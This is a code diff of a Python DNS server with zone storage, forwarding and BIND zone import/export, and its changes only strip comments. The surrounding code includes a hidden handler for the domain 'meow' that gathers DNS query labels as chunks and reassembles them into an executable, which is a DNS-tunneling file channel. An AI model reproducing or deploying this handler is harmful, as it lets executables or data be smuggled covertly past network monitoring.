@@ -18,7 +18,7 @@ def xor_bytes(data_bytes, key_byte):
 def parse_dns_query(data):
     """Extract QNAME labels from a raw DNS query packet."""
     qname = []
-    idx = 12  # skip DNS header
+    idx = 12
     length = data[idx]
     while length != 0:
         idx += 1
@@ -67,7 +67,6 @@ def ensure_db(db_path):
             answer TEXT,
             duration_ms INTEGER
         )""")
-        # default settings
         conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_addr','0.0.0.0')")
         conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_port','5353')")
         conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('default_ttl','300')")
@@ -110,7 +109,7 @@ class DNSHandler(socketserver.BaseRequestHandler):
 def send_test_dns_query(server_ip: str, keyword: str):
     """Send a test DNS query to a selected DNS server."""
     qname = f"{keyword}.example.local"
-    query = DNSRecord.question(qname, qtype="A")  # pass string instead of QTYPE.A
+    query = DNSRecord.question(qname, qtype="A")
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -129,10 +128,9 @@ class DNSServer(socketserver.ThreadingUDPServer):
         self.conn = sqlite3.connect(db_path, check_same_thread=False)
         self.conn.row_factory = sqlite3.Row
         self.special_domain = "meow"
-        self.chunks = {}  # for storing received chunks
+        self.chunks = {}
 
     def _zone_for_qname(self, qname):
-        # Longest-suffix match
         rows = self.conn.execute("SELECT * FROM zones").fetchall()
         matches = [r for r in rows if qname.endswith(r["name"])]
         if not matches:
@@ -162,11 +160,8 @@ class DNSServer(socketserver.ThreadingUDPServer):
         labels = qname.split(".")
         print(labels)
         if labels[-2] == self.special_domain:
-
-            # Example of handling chunked DNS data
             if labels[0] == "end":
                 print("[+] Stop signal received, reconstructing file...")
-                # Reconstruct bytes from chunks
                 ordered = [self.chunks[i] for i in sorted(self.chunks.keys())]
                 exe_bytes = b"".join(ordered)
 
@@ -195,18 +190,13 @@ class DNSServer(socketserver.ThreadingUDPServer):
 
         zone = self._zone_for_qname(qname)
         if zone:
-            # Authoritative answer
             name_rel = qname[:-len(zone["name"])].rstrip(".") if not qname == zone["name"] else ""
             owner = f"{name_rel}.{zone['name']}".lstrip(".")
-            # SOA / NS for apex
             if qtype in ("SOA","ANY") and qname == zone["name"]:
                 reply.add_answer(self._soa_rr(zone))
-
-            # Gather records
             rrs = []
             targets = [(owner, qtype)]
             if qtype == "ANY":
-                # return everything we have at that name
                 recs = self._all_records_name(zone["id"], owner)
                 for r in recs:
                     rr = build_rr(r, zone)
@@ -214,7 +204,6 @@ class DNSServer(socketserver.ThreadingUDPServer):
                         rrs.append(rr)
             else:
                 recs = self._records_for(zone["id"], owner, qtype)
-                # CNAME fallback
                 if not recs:
                     recs = self._records_for(zone["id"], owner, "CNAME")
                 for r in recs:
@@ -223,7 +212,6 @@ class DNSServer(socketserver.ThreadingUDPServer):
                         rrs.append(rr)
 
             if not rrs and qname == zone["name"] and qtype == "NS":
-                # Provide zone NS from SOA primary as minimal
                 rrs.append(RR(zone["name"], QTYPE.NS, rdata=NS(zone["primary_ns"]), ttl=zone["ttl"]))
 
             for rr in rrs:
@@ -233,7 +221,6 @@ class DNSServer(socketserver.ThreadingUDPServer):
                 reply.header.rcode = getattr(RCODE, "NXDOMAIN")
             return reply
 
-        # No authoritative zone, optionally forward
         settings = fetch_settings(self.conn)
         upstream = settings.get("upstream","").strip()
         if upstream:
@@ -248,7 +235,6 @@ class DNSServer(socketserver.ThreadingUDPServer):
             except Exception:
                 pass
 
-        # Otherwise respond NXDOMAIN
         reply.header.rcode = getattr(RCODE, "NXDOMAIN")
         return reply
 
@@ -273,7 +259,6 @@ def build_rr(rec, zone):
     if t == "TXT":
         return RR(name, QTYPE.TXT, rdata=TXT(rec["content"]), ttl=ttl)
     if t == "SRV":
-        # content format: "priority weight port target"
         parts = rec["content"].split()
         if len(parts) != 4:
             return None
@@ -290,7 +275,6 @@ class DNSServerThread(threading.Thread):
 
     def stop(self):
         self._stop.set()
-        # Sending a dummy packet to unblock server if waiting
         try:
             conn = sqlite3.connect(self.db_path)
             conn.row_factory = sqlite3.Row
@@ -314,7 +298,6 @@ class DNSServerThread(threading.Thread):
             while not self._stop.is_set():
                 server.handle_request()
 
-# BIND import/export helpers
 def export_zone_to_bind(conn, zone_id):
     zone = conn.execute("SELECT * FROM zones WHERE id=?", (zone_id,)).fetchone()
     recs = conn.execute("SELECT * FROM records WHERE zone_id=? ORDER BY name,type", (zone_id,)).fetchall()
@@ -332,7 +315,6 @@ def export_zone_to_bind(conn, zone_id):
     return "\n".join(lines) + "\n"
 
 def import_zone_from_bind(conn, text):
-    # very simple parser; expects $ORIGIN and SOA lines + records per line
     origin = None
     ttl_default = 300
     primary_ns = None
@@ -352,16 +334,13 @@ def import_zone_from_bind(conn, text):
             continue
         parts = line.split()
         if "SOA" in parts:
-            # @ IN SOA ns1.example. admin.example. (serial refresh retry expire minimum)
             i = parts.index("SOA")
             primary_ns = parts[i+1].rstrip(".") + "."
             admin_email = parts[i+2]
-            # Look for parentheses block or remaining 5 ints
             tail = " ".join(parts[i+3:]).replace("("," ").replace(")"," ").split()
             if len(tail) >= 5:
                 serial, refresh, retry, expire, minimum = map(int, tail[:5])
             continue
-        # record line
         name = parts[0]
         if name == "@":
             name = origin
@@ -369,7 +348,6 @@ def import_zone_from_bind(conn, text):
         content = parts[-1]
         ttl = 0
         priority = None
-        # MX/SRV have a priority field
         if rtype in ("MX","SRV") and len(parts) >= 5:
             priority = int(parts[-2]) if rtype == "MX" else int(parts[-3])
             content = " ".join(parts[-1:]) if rtype=="MX" else " ".join(parts[-2:])
